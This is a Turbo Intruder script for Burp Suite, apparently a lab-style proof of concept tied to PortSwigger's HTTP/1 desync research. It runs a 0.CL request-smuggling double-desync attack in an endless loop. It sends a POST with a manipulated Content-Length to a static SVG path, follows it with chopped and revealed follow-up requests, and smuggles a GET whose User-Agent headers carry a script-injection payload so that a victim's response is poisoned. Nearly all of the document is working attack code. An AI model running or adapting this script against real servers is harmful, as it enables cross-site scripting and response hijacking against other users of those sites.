# Refer to https://portswigger.net/research/http1-must-die
# nu11secur1ty 2025
# Burp post body smuggling

import time

def queueRequests(target, wordlists):
    # Check if target endpoint is set
    if not hasattr(target, 'endpoint') or not target.endpoint:
        raise Exception("Target endpoint is not defined!")

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    # Main payload with Content-Length placeholder
    kurnabiva1 = '''POST /resources/images/avatarDefault.svg HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

'''

    # Smuggled request payload
    smuggled = '''GET /post?postId=7 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y'''

    # Chopped request stage 2
    kurnabiva2_chopped = '''GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
X: Y'''

    # Revealed request stage 2
    kurnabiva2_revealed = '''GET /404 HTTP/1.1
Host: '''+host+'''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    # Victim request
    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: foo

'''

    # Safety checks
    if '%s' not in kurnabiva1:
        raise Exception('Please place %s in the Content-Length header value')

    if not kurnabiva1.endswith('\r\n\r\n'):
        raise Exception('kurnabiva1 request must end with a blank line and have no body')

    if not isinstance(engine, RequestEngine):
        raise Exception('RequestEngine is not created properly!')

    # Main attack loop
    while True:
        try:
            engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
            engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
            time.sleep(0.8)  # small delay
            engine.queue(victim, label='victim')
        except Exception as e:
            print(f"[!] Error while sending requests: {e}")
            break  # stop attack on fatal error

def handleResponse(req, interesting):
    table.add(req)

    # 0.CL attacks use a double desync
    # Uncomment below to automatically stop attack on success
    # if req.label == 'victim' and 'hgpov' in req.response:
    # req.engine.cancel()
